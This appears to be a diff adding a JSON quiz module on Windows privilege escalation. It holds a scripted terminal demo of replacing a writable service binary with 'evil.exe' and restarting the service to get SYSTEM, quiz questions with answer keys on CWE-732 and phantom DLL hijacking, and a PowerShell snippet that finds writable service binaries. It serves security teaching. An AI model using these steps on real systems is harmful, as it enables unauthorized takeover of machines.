@@ -1,0 +1,52 @@
+[
+  {
+    "type": "terminal",
+    "title": "winrecon → unquoted service path → SYSTEM",
+    "frames": [
+      {"delay": 0,    "text": "C:\\Users\\user> .\\winrecon.ps1", "cls": "dim"},
+      {"delay": 800,  "text": "[*] Running 20 reconnaissance sections...", "cls": ""},
+      {"delay": 1200, "text": "[*] Section 7: Service Binary Paths", "cls": ""},
+      {"delay": 700,  "text": "[!] CWE-732: VulnService path has weak ACL", "cls": "err"},
+      {"delay": 600,  "text": "    Path: C:\\Program Files\\VulnApp\\service.exe", "cls": "err"},
+      {"delay": 600,  "text": "    BUILTIN\\Users: (F) FULL CONTROL", "cls": "err"},
+      {"delay": 900,  "text": "C:\\Users\\user> copy evil.exe \"C:\\Program Files\\VulnApp\\service.exe\"", "cls": "dim"},
+      {"delay": 700,  "text": "[*] sc stop VulnService && sc start VulnService", "cls": "dim"},
+      {"delay": 900,  "text": "[+] Callback received: NT AUTHORITY\\SYSTEM", "cls": "ok"},
+      {"delay": 400,  "text": "// CWE-732 confirmed — standard user → SYSTEM", "cls": "ok"}
+    ]
+  },
+  {
+    "type": "mcq",
+    "question": "CWE-732 (service binary replacement) works at standard user because:",
+    "choices": [
+      "Windows services always run as SYSTEM regardless of the binary's ACL",
+      "The service manager can be tricked into running unsigned binaries",
+      "The service binary path has misconfigured ACLs — an unprivileged user has write access to the exe",
+      "UAC can be bypassed using the unquoted service path technique on any path"
+    ],
+    "answer": 2,
+    "explanation": "CWE-732: incorrect permission assignment. If BUILTIN\\Users or a low-priv account has write/full-control on the service binary, you replace it with your own. On next service start (or reboot), SCM runs your binary as SYSTEM."
+  },
+  {
+    "type": "mcq",
+    "question": "CWE-427 (phantom DLL hijack via ClickToRunSvc) exploits which Windows loader behaviour?",
+    "choices": [
+      "The service's manifest lists DLLs that don't exist — Windows searches PATH before System32",
+      "DLL redirection via .local files overrides SysWOW64 loads",
+      "KnownDLLs can be overwritten by standard users if the registry key ACL is weak",
+      "AppInit_DLLs loads arbitrary code at process creation without elevation"
+    ],
+    "answer": 0,
+    "explanation": "If a service imports a DLL that isn't present, the loader walks the DLL search order. If any user-writable directory appears before System32 in that order, you plant the DLL there. ClickToRunSvc had a search-order gap a standard user could exploit."
+  },
+  {
+    "type": "fillin",
+    "prompt": "winrecon checks 20 sections. Complete the PowerShell one-liner that finds writable service binaries:",
+    "code": "Get-WmiObject Win32_Service | \n  Where-Object { $_.PathName -ne $null } | \n  ForEach-Object {\n    $path = $_.PathName -replace '\"',''\n    $acl  = Get-Acl $path -ErrorAction SilentlyContinue\n    if ($acl) {\n      $acl.Access | Where-Object {\n        $_.IdentityReference -match 'Users|Everyone|Authenticated' -and\n        $_.FileSystemRights -match [BLANK]\n      }\n    }\n  }",
+    "answer": "FullControl|Write|Modify",
+    "answers": ["FullControl|Write|Modify", "Write", "FullControl", "Modify", "FullControl|Write"],
+    "hint": "The three dangerous permission levels (pipe-separated regex)",
+    "explanation": "FullControl, Write, or Modify on a service binary means a low-priv user can replace it. Any match here is a CWE-732 candidate.",
+    "wrong_hint": "You want to match any of: FullControl, Write, or Modify."
+  }
+]
